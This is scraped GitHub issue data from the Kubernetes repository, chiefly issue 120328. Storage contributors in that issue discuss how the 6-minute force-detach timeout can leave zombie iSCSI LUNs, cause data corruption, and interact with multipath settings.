[kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "kerthcet", "body": "/triage accepted"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124201#issuecomment-3251904126):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 120328, "issue_url": "https://github.com/kubernetes/kubernetes/issues/120328", "issue_title": "Flag to Disable the 6-minute Force Detach Window", "issue_author": "rohitssingh", "issue_body": "### What happened?\n\nCertain online upgrade workflows might need to restart kubernetes as a part of their upgrade procedure. This can lead to the following sequence:\r\n* As a part of draining a kubernetes node, a pod might get deleted.\r\n* The unmount of a pod could take more than 6 minutes.\r\n* If the node is deemed unhealthy when the 6 minute timer fires for the pod being deleted (for example, because kubelet is still restarting), then the underlying PV will be force detached (via a `ControllerUnpublishVolume` RPC)\r\n\r\nThese workflows would likely benefit from disabling this feature in lieu of the Non-Graceful Node Shutdown feature that hit GA in kubernetes 1.28 (see [here](https://kubernetes.io/blog/2023/08/16/kubernetes-1-28-non-graceful-node-shutdown-ga/) for more details).\r\n\r\nWhen these issues are encountered in our testbeds, we are left with Zombie iSCSI LUNs. If pods end up migrating to a node with such a Zombie LUN present, those pods might end up attaching themselves to the Zombie LUN leading to data corruption.\r\n\r\nThis data corruption has caused a number of our cluster-management applications to lose all access to their data, requiring them to be deployed from scratch (occasionally causing downtime for the entire cluster).\n\n### What did you expect to happen?\n\nThe ControllerUnpublishVolume request to wait indefinitely until NodeUnstageVolume has succeeded.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nSee the \u201cWhat happened?\u201d section for more details.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\nroot@bootstrapper:~# kubectl version\r\nClient Version: version.Info{Major:\"1\", Minor:\"23\", GitVersion:\"v1.23.5\", GitCommit:\"c285e781331a3785a7f436042c65c5641ce8a9e9\", GitTreeState:\"clean\", BuildDate:\"2022-03-16T15:58:47Z\", GoVersion:\"go1.17.8\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\nServer Version: version.Info{Major:\"1\", Minor:\"27\", GitVersion:\"v1.27.4-gke.500\", GitCommit:\"a955253697d6572565777f63dfe6df9fd74591a2\", GitTreeState:\"clean\", BuildDate:\"2023-07-26T09:27:11Z\", GoVersion:\"go1.20.6 X:boringcrypto\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\nWARNING: version difference between client (1.23) and server (1.27) exceeds the supported minor version skew of +/-1\r\n```\r\n\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\nGoogle\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/storage", "triage/accepted"], "comments": [{"author": "rohitssingh", "body": "/sig Storage\r\n\r\nTagging @bswartz, @msau42, @saad-ali, @jingxu97"}, {"author": "Devesh-N", "body": "Hi @rohitssingh \r\n\r\nThank you for the detailed issue report. The issue you've described with zombie iSCSI LUNs during Kubernetes upgrades sounds concerning, especially with the data corruption implications for cluster-management applications.\r\n\r\nFirstly, I noticed there's a version skew between your client (1.23) and server (1.27) that exceeds the supported minor version skew of +/-1. While this may not be directly related to the issue you're facing, it's generally a good idea to align the versions for more consistent behavior.\r\n\r\nRegarding the ControllerUnpublishVolume behavior, the intent of the 6-minute timer was to provide a timeout for certain scenarios, but it seems that in your case, it leads to undesirable outcomes. Since Kubernetes 1.28 introduced the Non-Graceful Node Shutdown feature, you're correct that disabling the previous timer-based feature could be beneficial.\r\n\r\nPossible Solutions and Next Steps:\r\nUpgrade to Kubernetes 1.28 or later: If possible, consider upgrading your Kubernetes cluster to take advantage of the Non-Graceful Node Shutdown feature.\r\n\r\nFurther Investigation: We would like to reproduce this issue in a controlled environment to understand it better. Would you be willing to share additional logs that could be useful?\r\n\r\nTemporary Workaround: As an immediate workaround, you may consider scripting a manual detach procedure that accounts for the time needed for NodeUnstageVolume to succeed.\r\n\r\nWe'll be looking into this issue more thoroughly. I'll keep you updated on our findings and potential fixes.\r\n\r\nThanks again for bringing this to our attention. Your detailed explanation is invaluable in understanding the severity and specifics of the problem."}, {"author": "rohitssingh", "body": "Thanks for the detailed feedback @Devesh-N.\r\n\r\nI'm in the process of uploading an associated PR; it'll be coming out shortly.\r\n\r\n> We would like to reproduce this issue in a controlled environment to understand it better. Would you be willing to share additional logs that could be useful?\r\n\r\nI think we can reproduce this by stopping kubelet on a node, killing a pod with a PV on that node, and then also bringing down the CSI node driver pod.\r\n\r\nWe would like everything to just wait for kubelet & the CSI node driver pod to be restored. But the 6-minute timer ends up firing leaving with PVs in the forced detach state."}, {"author": "Devesh-N", "body": "Hi @rohitssingh ,\r\n\r\nThank you for your prompt response, and I'm glad to hear that you're already working on a PR for this issue.\r\n\r\nYour steps for reproducing the problem by stopping kubelet and killing a pod with a PV on the affected node provide a clear path for investigating this further. We'll use this method to reproduce the issue on our end as well.\r\n\r\nRegarding the 6-Minute Timer:\r\nThe 6-minute timer was designed to handle certain edge cases, but as you've pointed out, it can cause more problems than it solves in specific scenarios like yours. It makes sense to reassess this feature, especially in the context of how it interacts with kubelet and CSI node driver pod outages.\r\n\r\nNext Steps:\r\nReview Your PR: Once your PR is submitted, we will review it as promptly as possible.\r\nInternal Reproduction: We will also try to reproduce the issue internally, using the steps you've provided, to better understand the root cause and any possible fixes or workarounds.\r\nDiscuss Possible Improvements: As part of our ongoing efforts, we will discuss whether we can make improvements to Kubernetes that would eliminate the need for a forced detach after the 6-minute timer elapses, especially when kubelet and the CSI node driver pod are expected to recover.\r\nWe appreciate your continued involvement and detailed input as we work towards resolving this issue. Your experiences and solutions are invaluable to the community."}, {"author": "carlory", "body": "/assign rohitssingh"}, {"author": "msau42", "body": "/triage accepted"}, {"author": "Devesh-N", "body": "/triage accepted"}, {"author": "YuikoTakada", "body": "Thank you for posting issue report.\r\n\r\n```\r\nIf the node is deemed unhealthy when the 6 minute timer fires for the pod being deleted (for example, because kubelet is still restarting), then the underlying PV will be force detached (via a ControllerUnpublishVolume RPC)\r\n```\r\nTo be exact, PV force detach occurs only when `out-of-service` taint is added to the unhealthy node. So, if you don't wish PV force-detach, you can avoid it by not adding the taint. PV force-detach doesn't occur automatically.\r\nThanks."}, {"author": "YuikoTakada", "body": "/cc @xing-yang "}, {"author": "xing-yang", "body": "@YuikoTakada There are two reasons for force detach, one is due to the `out-of-service` taint, and the other one is due to the 6 minute timeout.  See this PR that added reason for the force detach:\r\nhttps://github.com/kubernetes/kubernetes/pull/119185/files"}, {"author": "YuikoTakada", "body": "@xing-yang Thank you for your comments, I misunderstood "}, {"author": "akalenyu", "body": "@rohitssingh I am wondering if you ever actually hit the consequence described in the issue\n> If pods end up migrating to a node with such a Zombie LUN present, those pods might end up attaching themselves to the Zombie LUN leading to data corruption.\n\nWe think we see it but we don't entirely understand how it's possible.\n(Obviously the forced storage detach isn't very safe just trying to explain the phenomenon)\n\nI can certainly produce the forced detach in https://github.com/kubernetes/kubernetes/issues/120328#issuecomment-1702394693, but it's the zombie swap I am interesting in reproducing and understanding"}, {"author": "rohitssingh", "body": "> [@rohitssingh](https://github.com/rohitssingh) I am wondering if you ever actually hit the consequence described in the issue\n\nYes, we did encounter this issue in our environments.\n\n> \n> > If pods end up migrating to a node with such a Zombie LUN present, those pods might end up attaching themselves to the Zombie LUN leading to data corruption.\n> \n> We think we see it but we don't entirely understand how it's possible. (Obviously the forced storage detach isn't very safe just trying to explain the phenomenon)\n> \n> I can certainly produce the forced detach in [#120328 (comment)](https://github.com/kubernetes/kubernetes/issues/120328#issuecomment-1702394693), but it's the zombie swap I am interesting in reproducing and understanding\n\nOur issue was specific to the protocol we were using (iSCSI). Specifically, the problem was that the storage controller thought a LUN id was free for use (because of ControllerUnpublishVolume) when in fact it was still in use by a k8s node.\n\nTo reproduce this issue, I would suggest that you:\n* Inject errors in the NodeUnstageVolume path for a particular LUN.\n* Cordon the node that is running a pod that uses said LUN.\n* Delete the pod that was using that LUN.\n* The pod should try to come up on another node, leaving a \"zombie\" device behind.\n\nIf you then uncordon the node in question and cordon all other nodes and then start creating new pods that use new PVs, eventually the underlying storage controller will re-use the LUN id that was used by the \"zombie\" device; the LUN that comes up with this id will be in the state I mentioned above.\n\nI hope that helps!\n\n"}, {"author": "akalenyu", "body": "Thanks! just to make sure, the original LUN from the pod is the one getting corrupted? So the data of the original application?\n\nOr in some weird way the other \"new\" LUNs get corrupted?"}, {"author": "bswartz", "body": "> Thanks! just to make sure, the original LUN from the pod is the one getting corrupted? So the data of the original application?\n> \n> Or in some weird way the other \"new\" LUNs get corrupted?\n\nThere are two cases to consider:\n1) In the situation where the storage system can reuse the same LUN number for two different volumes, the main worry is that the new LUN gets confused with the old LUN, and the new LUN gets corrupted because it's mapped to a LUN number that the node things belongs to the old volume. In this case the old volume is safe, having been detached, and the risk comes from the confusion caused by reuse of numbers.\n2) You can have a case when the volume gets detached after 6 minutes, and attached to another node, then later detached and reattached back to the original node. Since the node doesn't know that another node has mounted/unmounted the volume in the meantime, it may think it's had exclusive access all long and will flush dirty buffers to the disk once it regains access. This would corrupt the original volume.\n\nBoth problems stem from the lack of node-side cleanup when the 6-minute force detach triggers. For this reason the only safe thing to do is to disable the 6-minute timer, and handle dead nodes by actually rebooting them and tainting the node."}, {"author": "akalenyu", "body": "Thank you for the answer, I think I am more interested in 2\n\n> 2\\. it may think it's had exclusive access all long and will flush dirty buffers to the disk once it regains access\n\nIs the existence of these dirty buffers realistic in a k8s environment? Where would dirty data come from? the first iteration of the workload (on this node?) Is that even possible?\n\nAnother question, I saw some drivers implementing guard rails (for what it looks like) against this problem:\nhttps://github.com/NetApp/trident/commit/b33021d64da7588d65b7f38cda7cd01873850e14\n(Second point)\nI guess those guard rails make sense regardless of the force detach behavior, since any bug in the driver could lead to a \"force detach\". WDYT?\n\n"}, {"author": "rohitssingh", "body": "The worst case I encountered was actually a combination of the two cases that Ben mentioned.\n\nLet us say that we have two volumes in use by two different pods:\n```\nV in use by pod p\nW in use by pod q\n```\n\nAnd two k8s hosts:\n```\nN\nO\n```\n\nAlong with three random LUN ids:\n```\ni\nj\nk\n```\n\nLet us assume that our LUN mappings are unique to each k8s host.\n\nIf initially `V` is mapped to `N` @ `i`, we will have the following LUN mappings:\n\n```\nOn k8s Hosts\t\t\tOn the Storage Controllers\n============\t\t\t==========================\nN:\ni -> V\t\t\t\t\ti -> V \n\nO:\nN/A\t\t\t\t\t\tN/A\n```\n\nThis looks fine so far.\n\nBut things can get broken if we try to migrate pod `p`, which uses `V`, to `O`.\n\nNode N has 6 minutes to tear down `V` so that it can be resurrected on `O`. However, if the timer fires before cleanup finishes, then KCM will prematurely issue a `ControllerUnpublishVolume` leading to a force detach.\n\nThis will leave us with:\n```\nOn k8s Hosts\t\t\tOn the Storage Controllers\n============\t\t\t==========================\nN:\ni -> V\t\t\t\t\tN/A\n\nO:\nN/A\t\t\t\t\t\tN/A\n```\n\nLater, KCM will issue a `ControllerPublishVolume` for `V` on `O`, leaving:\n```\nOn k8s Hosts\t\t\tOn the Storage Controllers\n============\t\t\t==========================\nN:\ni -> V\t\t\t\t\tN/A\n\nO:\nj -> V\t\t\t\t\tj -> V \n```\n\nwhere `j` is some LUN id that was free for use in `O`'s mapping space.\n\nThe state on node `N` is not correct and can now result in serious problems after more pods get scheduled. Among other issues, this is dangerous because all of `V`'s buffers might not be flushed and committed at the time the mapping is broken. But as we will see, we have bigger problems too...\n\nIf pod `q` now gets scheduled on `N`, the storage controller is free to allocate any available LUN id; since it believes `i` is available, it is free to use it again.\n\nIf it does opt to allocate `i` here, we will then have the following mappings:\n```\nOn k8s Hosts\t\t\tOn the Storage Controllers\n============\t\t\t==========================\nN:\ni -> V\t\t\t\t\tN/A\ni -> W\t\t\t\t\ti -> W\n\nO:\nj -> V\t\t\t\t\tj -> V \n```\n\nTechnically speaking, we do not yet have an problem; though we have a stale mapping for `V` on `N`, it is not actively in use.\n\nBut we will have a problem if `p` ever returns to `N`, when we will have:\n```\nOn k8s Hosts\t\t\tOn the Storage Controllers\n============\t\t\t==========================\nN:\ni -> V\t\t\t\t\tk -> V\ni -> W\t\t\t\t\ti -> W\n\nO:\nN/A\t\t\t\t\t\tN/A\n```\n\nwhere `k` is some LUN id that was free for use in `N`'s mapping space.\n\nSince the device is already established (and maybe even mounted in the appropriate namespace), the underlying machinery will then present the same LUN (i.e., `i` which is actually mapped to the LUN backing `W`) to both pods `p` & `q`. This will result in data corruption as both pods proceed to write data & flush their respective superblocks.\n\nI will let Ben speak to the driver-side mitigations (in particular, the change you referenced seems to be his handiwork :) )."}, {"author": "bswartz", "body": "> Is the existence of these dirty buffers realistic in a k8s environment? Where would dirty data come from? the first iteration of the workload (on this node?) Is that even possible?\n\nRohit gave a very detailed explanation, but very shortly, the dirty data is any data written by an application or filesystem which never got acknowledged because write access was cut off by a controller unpublish. This can happen if you trigger the non-graceful-node-shutdown feature _without_ actually rebooting the node. Once the node regains write access to the volume it will continue writing without checking to see if anyone else wrote data in the mean time.\n\n> Another question, I saw some drivers implementing guard rails (for what it looks like) against this problem: [NetApp/trident@b33021d](https://github.com/NetApp/trident/commit/b33021d64da7588d65b7f38cda7cd01873850e14) (Second point) I guess those guard rails make sense regardless of the force detach behavior, since any bug in the driver could lead to a \"force detach\". WDYT?\n\nI have never successfully used the Trident force detach feature. I know that it's one of many such implementations in drivers to try to mitigate this problem. How easy or hard this is depends a lot of the underlying data protocol. iSCSI is one of the worst I've seen, thanks to how complex the Linux initiator implemenation is."}, {"author": "akalenyu", "body": "Thanks again for investing in replies here @rohitssingh @bswartz!\nI have tried to follow the reproducer;\n\n> If pod `q` now gets scheduled on `N`, the storage controller is free to allocate any available LUN id; since it believes `i` is available, it is free to use it again.\n> \n> If it does opt to allocate `i` here, we will then have the following mappings:\n> \n> ```\n> On k8s Hosts\t\t\tOn the Storage Controllers\n> ============\t\t\t==========================\n> N:\n> i -> V\t\t\t\t\tN/A\n> i -> W\t\t\t\t\ti -> W\n> \n> O:\n> j -> V\t\t\t\t\tj -> V \n> ```\n> \n> Technically speaking, we do not yet have an problem; though we have a stale mapping for `V` on `N`, it is not actively in use.\n\nThing is, at least with multipath, it will correct this state once a new volume/pod combo schedules on `N`.\nSo, I am seeing that it **does** opt to allocate LUN ID `i`, it just remediates the force detached state as far as `lsblk/multipath -ll` is concerned - the \"bad\" entry disappears from `multipath -ll` output.\nSo I don't think is the case for me\n> ```\n> On k8s Hosts\t\t\tOn the Storage Controllers\n> ============\t\t\t==========================\n> N:\n> i -> V\t\t\t\t\tN/A\n> ```\nand instead it's\n> ```\n> On k8s Hosts\t\t\tOn the Storage Controllers\n> ============\t\t\t==========================\n> N:\n> i -> W\t\t\t\t\ti -> W\n> ```\n\nAnd thus upon completing the reproducer's execution, I see no corruption.\nI think these multipath logs are related to the remediation\n```\nmultipathd[32318]: sdc: path wwid changed from 'FORCE_DETACHED_WWID' to 'NEW_WWID'\n...\nmultipathd[32318]: 8:32: path removed from map FORCE_DETACHED_WWID\nmultipathd[32318]: FORCE_DETACHED_WWID: sdd - tur checker reports path is up\nmultipathd[32318]: FORCE_DETACHED_WWID: remaining active paths: 1\nmultipathd[32318]: sdd: path wwid changed from 'FORCE_DETACHED_WWID' to 'NEW_WWID'\nmultipathd[32318]: FORCE_DETACHED_WWID Last path deleted, disabling queueing\nmultipathd[32318]: FORCE_DETACHED_WWID: map flushed after removing all paths\n```\n\nWere you encountering the issues on an environment with multipath as well?"}, {"author": "rohitssingh", "body": "That's very interesting @akalenyu!\n\nI think we are using multipath too, but we never would end up down that codepath.\n\nThe last line where the map device is being flushed & removed is printed from `flush_map_nopaths` [here](https://github.com/opensvc/multipath-tools/blob/de16cf82c5263fc148118be56ebf44c8f0ee60b8/multipathd/main.c#L635C1-L637C14):\n\n```\n\tcondlog(2, \"%s: map flushed after removing all paths\", mpp->alias);\n\tremove_map_and_stop_waiter(mpp, vecs);\n\treturn true;\n```\n\nIn our case, we have `queue_if_no_path` enabled, so we wouldn't even get to this point.\n\n"}, {"author": "bmarzins", "body": "@rohitssingh this log message:\n```\nmultipathd[32318]: FORCE_DETACHED_WWID Last path deleted, disabling queueing\n```\nmeans `flush_on_last_del` is enabled and it disabled `queue_if_no_path` when the last path was deleted.\n\n@akalenyu  looking at those logs, it looks like they are already consistent with a situation where corruption can occur. These two lines:\n```\nmultipathd[32318]: FORCE_DETACHED_WWID: sdd - tur checker reports path is up\nmultipathd[32318]: FORCE_DETACHED_WWID: remaining active paths: 1\n```\nare printed by the path checker. Specifically `remaining active paths` is printed after the path is re-enabled. The line where the changed WWID is noticed:\n```\nmultipathd[32318]: sdd: path wwid changed from 'FORCE_DETACHED_WWID' to 'NEW_WWID'\n```\nis printed when multipathd processes the uevent that presumably was issued when the LUN reappeared, and it appears after the path checker lines. The moment that the path is re-enabled in the kernel, it is able to flush any queued IO to it. This means that if there was queued IO to that device, these logs appear to show a window where the kernel could have sent it to the bad path before multipathd removed it. It is possible to close this window by setting the `recheck_wwid` configuration parameter. This will check for changed WWIDs whenever a path comes back online. That still can't remove the possibility of corruption completely. It is possible that a path changes WWIDs without multipathd ever noticing that it went down, and IO could go to it before multipathd processes the uevent for the change."}]}
